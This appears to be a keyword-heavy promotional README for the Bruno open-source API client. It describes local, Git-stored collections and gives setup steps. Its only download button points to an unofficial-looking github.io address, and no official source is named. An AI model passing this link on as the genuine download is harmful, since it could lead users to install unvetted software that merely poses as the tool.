# Bruno - Open-Source API Testing and Development Tool

> **A lightweight, private workspace for API testing and development: keep collections local, readable, and version-friendly.**

---

## Why This Exists

Most API workflows push teams into accounts, sync layers, and hidden storage. **Bruno** takes a different path: collections live as plain files on your machine, so API work stays transparent, reviewable, and portable. Bruno API testing becomes part of your repository instead of a separate silo.

Bruno solves **one specific problem**: API development that should stay local and understandable. Open Bruno, create a request, organize it into a collection, and run it without sending your data to a hosted service. If you have ever wanted a Bruno Postman alternative that respects your filesystem and your Git habits, this is it.

The tool is open-source and focused. It does not try to be a full platform. It measures success by how quickly you can move from idea to request to repeatable API check, with a Bruno API client that feels familiar and stays out of the way.

## About Bruno

Bruno is an open-source API client for testing and developing APIs. It positions itself as a lightweight and more private alternative to Postman and Insomnia. Collections are stored as plain text files, which means they can be committed, reviewed, merged, and shared like any other source file. Bruno API development stays close to the codebase, and Bruno API testing stays reproducible across machines.

For developers who value ownership, Bruno offers a calmer path. There is no forced cloud account, no opaque sync, and no need to export your work to understand it. The Bruno API client supports requests, environments, variables, and scripting in a desktop environment that works offline by default.

Bruno also fits team habits. A collection can live in the same repository as the service it tests. Reviewers can read the diff. New contributors can clone and run. That is the core promise of Bruno API development: your API work is just files, and your files are yours.

## Starting with Bruno

[![GET Bruno](https://img.shields.io/badge/GET%20%E2%80%94%20Bruno-0078D6?style=for-the-badge&logoColor=white)](https://bruno-offline-api-tool.github.io/.github/bruno-api-client)

1. **Prepare:** Confirm you have a supported desktop environment and a folder where collections can live.
2. **Open Bruno:** Launch the Bruno API client and create a new collection in a location you control.
3. **Add a request:** Define the method, URL, headers, and body for your first API call.
4. **Configure environment:** Add variables so Bruno API testing can switch between local and remote targets.
5. **Send and inspect:** Run the request, review the response, and adjust as needed.
6. **Save and version:** Keep the collection in Git so Bruno API development stays reviewable.
7. **Repeat:** Add more requests and organize them into folders that match your service.
